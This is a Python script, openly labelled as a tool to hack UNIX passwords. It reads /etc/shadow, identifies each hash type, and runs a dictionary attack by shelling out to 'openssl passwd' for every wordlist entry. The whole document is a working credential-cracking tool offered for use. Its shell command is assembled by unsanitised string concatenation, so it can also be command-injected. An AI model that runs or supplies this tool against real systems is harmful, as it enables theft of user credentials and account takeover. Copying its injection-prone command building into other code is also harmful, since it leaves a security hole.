#Script to hack passwords of a UNIX system

import os

def checkpass(passwd):
    semi_c = ':'
    d_sign = '$'
    pwdlist = passwd.split("$")
    encryption_format=pwdlist[1]

    if encryption_format=='6':
        print('Encryption of SHA512')
    elif encryption_format=='5':
        print('Encryption of SHA256')
    elif encryption_format=='1':
        print('Encryption of MD5')
    elif encryption_format=='2a' or encryption_format=='2y':
        print('Encryption of Blowfish')
    else:
        print('Unknown encryption format')

    salt = pwdlist[2]
    print ('Salt is : ' + salt)
    cryptPas = passwd.split(d_sign, 3)[3]
    cryptPass = cryptPas.split(semi_c)[0]

    #Use your own word-list to crack the passwords
    dictFile = open('wordlists/wlist1.txt', 'r')

    for word in dictFile.readlines():

        word = word.strip('\n').lower()
        print ('Comparing to pass in list : ' + word )
        x=os.popen('openssl passwd -'+encryption_format+' -salt '+salt+' '+word)
        cryptWord=x.read().strip('\n')
        
        if (cryptWord==passwd):
            print('[+] Password found as '+word+'\n')
            return 


    print ('[-] Password not found.\n')

def main():

    passFile = open('/etc/shadow')
    for line in passFile.readlines():
        if ":" in line:
            user = line.split(':')[0]
            cryptPass = line.split(':')[1].strip(' ')
            if len(cryptPass)<4:
                continue
            print ("[*] Cracking Password For: "+user)
            
            checkpass(cryptPass)

if __name__ == '__main__':
    main() 